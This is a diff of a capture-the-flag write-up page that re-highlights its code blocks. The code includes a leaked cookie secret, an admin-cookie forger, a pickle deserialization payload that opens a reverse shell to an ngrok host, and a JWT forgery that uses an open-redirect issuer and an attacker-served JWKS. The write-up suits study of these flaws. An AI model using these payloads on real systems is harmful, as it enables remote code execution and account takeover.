@@ -97,21 +97,21 @@
 
 <p>Without looking into the templates, I started just obtaining admin session. I leaked the secret for signing the cookies from <code class="highlighter-rouge">/app/config/secret.py</code>:</p>
 
-<pre><code class="language-Python">sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
-</code></pre>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sekai</span> <span class="o">=</span> <span class="s">"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"</span>
+</code></pre></div></div>
 
 <p>I then installed Bottle and used it to serve webpage that sets signed cookie with data <code class="highlighter-rouge">{"name": "admin"}</code> to obtain the admin cookie:</p>
 
-<pre><code class="language-Python">from bottle import route, run, request, response
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">response</span>
 
-@route('/hello')
-def hello():
-    session = {"name": "admin"}
-    response.set_cookie("name", session, secret="Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu")
-    return "Hello World!"
+<span class="o">@</span><span class="n">route</span><span class="p">(</span><span class="s">'/hello'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">hello</span><span class="p">():</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="p">{</span><span class="s">"name"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">}</span>
+    <span class="n">response</span><span class="p">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s">"name"</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">secret</span><span class="o">=</span><span class="s">"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">"Hello World!"</span>
 
-run(host='localhost', port=8080, debug=True)
-</code></pre>
+<span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'localhost'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8080</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
 
 <p>The value of the admin cookie produced is <code class="highlighter-rouge">!rsOwvUb6jllVHQVOPlZv5w==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFYWRtaW6Uc4aULg==</code>. I then set the cookie named <code class="highlighter-rouge">name</code> as this value, and visited <code class="highlighter-rouge">/sign</code>, however, the page shown to me was not impressive. It showed me “Hello, you are admin, but it’s useless.”</p>
 
@@ -129,31 +129,31 @@ Hello, you are {{name}}, but it’s useless.
 
 <p>Our team crafted a similar payload as the cookie value based on this exploit and got the flag:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
-import base64
-import os
-import hmac
-import hashlib
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pickle</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">hmac</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
 
-class RCE:
-    def __reduce__(self):
-        cmd = """
+<span class="k">class</span> <span class="nc">RCE</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="s">"""
             python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.eu.ngrok.io",16526));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
-        """
-        return os.system, (cmd,)
+        """</span>
+        <span class="k">return</span> <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,)</span>
 
-def gen_cookie(payload):
-    b64pld = base64.b64encode(payload)
-    signature = base64.b64encode(
-        hmac.new(
-            b"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu", b64pld, hashlib.md5
-        ).digest()
-    )
-    return b'"!' + signature + b"?" + b64pld + b'"'
+<span class="k">def</span> <span class="nf">gen_cookie</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">b64pld</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">signature</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span>
+        <span class="n">hmac</span><span class="p">.</span><span class="n">new</span><span class="p">(</span>
+            <span class="sa">b</span><span class="s">"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"</span><span class="p">,</span> <span class="n">b64pld</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span>
+        <span class="p">).</span><span class="n">digest</span><span class="p">()</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="sa">b</span><span class="s">'"!'</span> <span class="o">+</span> <span class="n">signature</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"?"</span> <span class="o">+</span> <span class="n">b64pld</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'"'</span>
 
-if __name__ == "__main__":
-    pickled = pickle.dumps(RCE())
-    print(gen_cookie(pickled))
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">pickled</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">RCE</span><span class="p">())</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">gen_cookie</span><span class="p">(</span><span class="n">pickled</span><span class="p">))</span>
 </code></pre></div></div>
 
 <h3 id="bottle-poem-conclusion">Bottle Poem Conclusion</h3>
@@ -174,32 +174,32 @@ if __name__ == "__main__":
 
 <p>Generate RSA private and public key:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl genrsa -out rsa.private 512
-openssl rsa -in rsa.private -out rsa.public -pubout -outform PEM
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl genrsa <span class="nt">-out</span> rsa.private 512
+openssl rsa <span class="nt">-in</span> rsa.private <span class="nt">-out</span> rsa.public <span class="nt">-pubout</span> <span class="nt">-outform</span> PEM
 </code></pre></div></div>
 
 <p>Make <code class="highlighter-rouge">jwks.json</code> to be served with HTTP server:</p>
 
-<pre><code class="language-JSON">{
-    "keys": [
-        {
-            "alg": "RS256",
-            "x5c": [
-                "&lt;content of public key&gt;"
-            ]
-        }
-    ]
-}
-</code></pre>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"keys"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"x5c"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+                </span><span class="s2">"&lt;content of public key&gt;"</span><span class="w">
+            </span><span class="p">]</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
 
 <p>Generate the admin token:</p>
 
-<pre><code class="language-Python">import jwt
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">jwt</span>
 
-private_key = open('rsa.private').read()
+<span class="n">private_key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'rsa.private'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
 
-print(jwt.encode({'user': 'admin'}, private_key, 'RS256', {'issuer': 'http://localhost:8080/logout?redirect=https://my-server.example.com/.well_known/jwks.json&amp;a='})
-</code></pre>
+<span class="k">print</span><span class="p">(</span><span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">({</span><span class="s">'user'</span><span class="p">:</span> <span class="s">'admin'</span><span class="p">},</span> <span class="n">private_key</span><span class="p">,</span> <span class="s">'RS256'</span><span class="p">,</span> <span class="p">{</span><span class="s">'issuer'</span><span class="p">:</span> <span class="s">'http://localhost:8080/logout?redirect=https://my-server.example.com/.well_known/jwks.json&amp;a='</span><span class="p">})</span>
+</code></pre></div></div>
 
 <p>The token looks like this:</p>
 
